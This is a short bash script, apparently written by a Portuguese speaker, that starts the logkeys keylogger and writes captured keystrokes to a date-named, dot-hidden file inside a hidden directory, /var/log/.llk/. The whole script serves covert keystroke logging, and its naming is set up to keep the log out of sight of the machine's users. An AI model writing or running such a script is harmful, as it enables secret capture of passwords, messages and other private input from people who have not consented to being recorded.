#!/bin/bash

data=`date '+%d-%m-%y'`
ext='.log'
hidden='.'
nome=$hidden$data$ext
touch /var/log/.llk/$nome
logkeys --start --output /var/log/.llk/$nome
